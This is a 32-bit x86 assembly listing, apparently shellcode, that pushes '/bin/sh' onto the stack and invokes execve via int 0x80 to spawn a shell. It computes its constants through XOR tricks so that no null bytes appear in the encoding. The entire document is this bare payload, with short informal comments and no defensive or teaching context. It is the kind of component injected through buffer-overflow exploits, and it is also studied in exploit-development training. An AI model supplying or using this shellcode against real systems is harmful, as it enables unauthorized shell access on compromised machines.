BITS 32

push    ebp
mov     ebp, esp
xor     eax, eax
push    eax
push    0x68732f6e       ; ascii "hs/n"
push    0x69622f78       ; ascii "ib/x"
mov     eax, 0xffffffff
xor     eax, 0xfffffff4  ; eax = 11 (SYSCAL = execve)
mov     ebx, esp         ; ebx = esp (points to "x/bin/sh")
mov     ecx, 0xffffffff
xor     ecx, 0xfffffffe  ; ecx = 1
add     ebx, ecx         ; ebx += 1 (points to "/bin/sh")
xor     ecx, ecx         ; ecx = 0
xor     edx, edx         ; edx = 0
int     0x80
mov     eax, 0xffffffff
xor     eax, 0xfffffff3  ; eax = 12
add     esp, eax         ; esp += 12 (add 12 to stack pointer cuz of the pushes earlier)
pop     ebp
ret

